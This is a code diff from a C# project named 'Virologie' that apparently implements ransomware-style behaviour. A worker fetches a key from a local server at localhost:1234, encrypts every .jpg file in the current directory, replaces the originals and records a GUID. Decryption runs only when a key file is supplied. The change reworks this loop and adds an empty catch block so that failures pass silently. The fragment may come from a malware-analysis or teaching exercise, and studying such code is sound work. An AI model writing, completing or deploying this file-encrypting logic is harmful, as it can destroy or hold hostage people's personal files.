@@ -49,25 +49,22 @@ namespace Virologie
             WorkerReportsProgress = true;
         }
 
-        void worker_DoWork(object sender, DoWorkEventArgs args)
+        private void worker_DoWork(object sender, DoWorkEventArgs args)
         {
             var explorer = new FileExplorer();
             FileEncrypter encrypter = (_keyfile == null)
-                ? CryptoKeyManager.CreateFromServer("http://localhost:1234/") 
+                ? CryptoKeyManager.CreateFromServer("http://localhost:1234/")
                 : CryptoKeyManager.CreateFromFile(_keyfile);
 
-            if (encrypter != null)
-            {
-                var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
-                int count = 1;
-                var enumerable = files as IList<string> ?? files.ToList();
-                CryptoKeyManager.SaveGUID();
-                foreach (var file in enumerable)
-                {
-                    ReportProgress(100 * count++ / (100 * enumerable.Count()));
-                    CurrentFile = file;
-                    SwitchFiles();
+            var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
+            int count = 1;
+            var enumerable = files as IList<string> ?? files.ToList();
+            CryptoKeyManager.SaveGUID();
 
+            foreach (var file in enumerable)
+            {
+                try
+                {
                     if (_keyfile != null)
                         encrypter.Decrypt(file);
                     else
@@ -75,6 +72,11 @@ namespace Virologie
 
                     explorer.ReplaceFile(file);
                 }
+                catch
+                { }
+                ReportProgress(100*count++/(100*enumerable.Count()));
+                CurrentFile = file;
+                SwitchFiles();
             }
         }
     }
